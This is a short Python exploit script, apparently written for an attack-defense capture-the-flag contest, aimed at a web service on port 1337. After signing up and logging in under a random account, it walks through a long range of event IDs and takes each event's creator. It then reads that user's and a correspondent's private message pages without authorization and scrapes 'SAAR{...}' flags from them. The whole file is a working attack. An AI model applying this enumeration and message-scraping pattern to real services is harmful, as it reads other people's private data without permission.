#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import sys, re, requests
import string, random, uuid, re, json
from storage import storage_set, storage_get


def generator(size=12, chars=string.digits + string.ascii_letters):
    return ''.join(random.choice(chars) for _ in range(size))

ip = sys.argv[1]

url = 'http://' + ip + ':1337/'
s = requests.Session()

username = generator()
password = generator()

headers = {'User-Agent' : 'Mozilla/5.0'}

#html = s.get(url + 'events/AnxiousDullPatricia5399', headers=headers).text
s.get(url + '/signup?', params={'username' :  username, 'password' : password, 'to' : ''}, headers=headers)
s.post(url + '/login?', params={'username' :  username, 'password' : password, 'to' : ''}, headers=headers)



count = 15848082
counter = 0
for i in range(15848082,16848082):
    if not storage_get(ip + ':' + str(i)):
        html = s.get(url + 'events/{}'.format(i), headers=headers, timeout=(None, None))
        status = html.status_code
        if status == 404:
            counter += 1

        if counter > 5:
            break
        try:
            creator = json.loads(html.text)['creator']
        except:
            continue

        html = s.get(url + 'users/' + creator + '_messages', headers=headers, timeout=(None, None)).text

        messages = re.findall('{.*?}', html)

        try:
            froom = json.loads(messages[0])["from"]
        except:
            continue

        html = s.get(url + 'users/' + froom + '_messages', headers=headers, timeout=(None, None)).text

        messages = re.findall('{.*?}', html)

        for item in messages:
            text = json.loads(item)["text"]
            flag = re.findall('SAAR\{[A-Za-z0-9-_]{32}\}', str(text).replace('%7B', '{').replace('%7D', '}'))
            if flag:
                print(flag, flush=True)
                storage_set(ip + ':' + str(i))
                break






